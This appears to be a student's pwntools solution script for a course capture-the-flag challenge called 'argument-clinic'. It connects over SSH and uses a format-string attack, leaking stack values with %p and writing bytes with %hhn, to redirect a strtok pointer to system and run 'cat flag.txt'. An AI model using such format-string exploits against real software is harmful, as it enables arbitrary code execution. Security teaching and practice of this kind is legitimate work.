from pwn import * 
context.clear(arch='amd64', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
s = ssh('jjcabral', 'cs4401shell.walls.ninja', keyfile='jjcabral_ssh_key')
s.set_working_directory('/problems/argument-clinic_0_f82a5fc2a8fba39748a2482d3e6cf624/')

#Only for sanity check
sys_addr = 0x7ffff7a31420
#            0x7ffff7a31420 #Only need to write 3 bytes
strTokAddr = 0x7ffff7a62970
tarAddr = 0x555555754c18
addr1 = b'\x18\x4c\x75\x55\x55\x55'
addr2 = b'\x19\x4c\x75\x55\x55\x55'
addr3 = b'\x1a\x4c\x75\x55\x55\x55'
test_addr = b'\xef\xbe\xad\xde'
emptyString = b'\0'
payload = b''

payload += b'%117$p%118$p%119$p%120$p%121$p%122$p%123$p%124$p%125$p%126$p'#60
#payload += b'%108$p%109$p%110$p%111$p%112$p%113$p%114$p%115$p%116$p%117$p'

#Use this to find your address locations ^
pad = b'c'*1
cad = b'd'*1
#Some padding to allign the addresses in mem
start= b'cat flag.txt '#size: 13
fmt_str1 = b'%19c%119$hhn' #103 Need to write 20 = 32 -13 = 19 
fmt_str2 = b'%244c%120$hhn'#104 Need to write 14 = 20, which isn't possible, so 276 (276 - 19 - 13) = 244
fmt_str3 = b'%143c%121$hhn'#105 Need to write a3 = 163, which isn't possible, so 419 (419 - 244 - 19 - 13) = 143
fmt_str = start+fmt_str1+fmt_str2+fmt_str3
exploit = flat({0:fmt_str,59:pad})

p = s.process(['./argument_clinic', exploit,addr1,emptyString,addr2,emptyString,addr3,emptyString, pad, cad, pad, cad, emptyString])
print(p.recvlineS())
print(p.recvlineS())
# p.recvall()
# exploit,addr1,emptyString,addr2,emptyString,addr3,emptyString,pad,emptyString
